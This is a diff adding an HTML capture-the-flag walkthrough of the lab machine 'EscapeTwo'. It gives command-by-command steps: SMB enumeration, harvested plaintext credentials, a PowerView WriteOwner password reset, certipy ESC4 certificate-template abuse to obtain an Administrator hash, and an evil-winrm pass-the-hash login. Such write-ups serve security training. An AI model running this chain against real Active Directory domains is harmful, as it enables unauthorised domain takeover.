@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>EscapeTwo - Walkthrough</h1>
+        </div>
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+            <ul>
+                <p> Nmap founds that there multiple ports which reveals that an active directory machine is towards us</p>
+                <pre><code class="language-bash">nmap -sV -O 10.10.11.51</code></pre>
+
+                <p> Having in mind that SMB is present we listed the available shares and found an intersting one</p>
+                <pre><code class="language-bash">smbclient -L 10.10.11.51 -N  
+smbclient //10.10.11.51/Accounting Department</code></pre>
+                <p>Inside this share we found an .exe file with an interesting name "accounts.xlsx". Even though when we opened, we discovered that data was ofuscated</p>
+                <p>Renaming the file to .zip and navigating through configuration files we found a file which give us a username. Aparently a MSSQL username </p>
+                <pre><code class="language-bash"> sa:MSSQLP@ssw0rd!</code></pre>
+                 
+                <p>Using basic comannds to RECONFIGURE environment in MSSQL we gain access to <b>sql_svc</b> user. More info <a class="notion-link" href="/H4ckV4ult/pages/protocols/mssql.html">here</a></p>
+                <p>With that user we access to directory <b>C:\SQL2019\ExpressAdv_ENU</b> and found a file called "sql-Configuration.INI" which contained credentials crentials. Searching we for a user we pivoted</p>
+                <pre><code class="language-bash"> ryan:WqSZAF6CysDQbGb3</code></pre>
+            </ul>    
+                <h2>Privilege Escalation</h2>
+                <ul>
+                    <p>Using bloodhound tool we found that user ryan has <b>Write Owner</b> permission over ca_svc. This means that we can change the owner of ca_svc user which can lead to change password of the user wihout knowing it.</p>
+                    <p>Using the the bloodhound provided commands we were able to change the password of the user <b>ca_svc</b></p>
+                    <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $SecPassword)
+Set-DomainObjectOwner -Credential $Cred -Identity ca_svc -OwnerIdentity ryan
+Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
+$UserPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force
+Set-DomainUserPassword -Identity ca_svc -AccountPassword $UserPassword -Credential $Cred</code></pre>
+                    <p>In order to check is password was changed we used crackmapexec</p>    
+                    <pre><code class="language-bash">crackmapexec smb 10.10.11.51 -u ca_svc -p 'WqSZAF6CysDQbGb3'</code></pre>    
+                    
+                    <p>If we look at bloodhound, this user is part of CERT PUBLISHERS group which is a default group in AD. Members of this group can request certificates and more. Also out ca_svc user is a Certification Authority which means it can request, modify... certificates</p>
+                    <p>Using a tool called we can identify vulnerable configurations in certificates (ESC4 vulnerability)</p>
+                    <pre><code class="language-bash">certipy find -u 'ca_svc@sequel.htb' -p 'WqSZAF6CysDQbGb3' -dc-ip '10.10.11.51' -vulnerable -stdout</code></pre> 
+                    <p>This will list a certificate called <b>"DunderMifflinAuthentication"</b> which has the following permisions</p>
+                    <pre><code class="language-bash">Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Cert Publishers</code></pre>
+                    <p>As we can see the group Cert Publishers has full control over the certificate</p>
+                    <p>Using the tool certipy we can update the temnplate allowing certificates requests that do not require manager approval and ensures the client authentication extended key usage is enabled. With this config we can request a certificate from a highly privielged user such as Administrator</p>
+                    <pre><code class="language-bash">certipy template -u ca_svc@sequel.htb -p 'WqSZAF6CysDQbGb3' -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51</code></pre>     
+                    <p>Request certificate as Administrator user</p>
+                    <pre><code class="language-bash">certipy req -u 'ca_svc' -p 'WqSZAF6CysDQbGb3' -dc-ip '10.10.11.51' -template 'DunderMifflinAuthentication' -ca 'sequel-DC01-CA' -dns 'administrator.sequel.htb' -upn 'Administrator@sequel.htb'</code></pre>     
+                    <p>This will generate a admnistrator.pfx file (certificate) which will be used to authenticate as adminastrator user and extract NT hash </p>        
+                    <pre><code class="language-bash"></code>certipy auth -pfx administrator_administrator.pfx -domain sequel.htb</pre>
+                    <p>Now that we have the hash we can authenticate with evil winrm specifiying it</p>
+                    <pre><code class="language-bash"></code>/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</pre>    
+
+                    
+                    
+                </ul>
+                
+           
+        </ul>    
+        
+
+        </div>
+    </div>
+
+
+</body>
+</html>
